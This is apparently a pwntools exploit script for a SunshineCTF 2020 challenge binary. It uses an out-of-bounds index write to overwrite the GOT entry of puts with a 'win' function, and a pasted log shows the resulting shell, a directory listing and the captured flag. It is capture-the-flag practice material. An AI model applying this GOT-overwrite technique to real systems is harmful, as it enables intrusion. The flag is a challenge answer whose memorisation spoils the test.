from pwn import *

p = remote('chal.2020.sunshinectf.org', 30008)
#p = process('./chall_08')

e = ELF('./chall_08')

val = e.symbols['got.puts'] - e.symbols['target']
val /= 8

print('%d\n' %(val))
print('%ld\n' %(e.symbols['win']))
p.send('%d\n' %(val))
p.send('%ld\n' %(e.symbols['win']))

input('...')

p.interactive()

'''
[+] Opening connection to chal.2020.sunshinectf.org on port 30008: Done
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_08'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
-11

4195687

...ls
[*] Switching to interactive mode
$ ls
chall_08
flag.txt
$ cat flag.txt
sun{fiction-fa1a28a3ce2fdd96}
'''
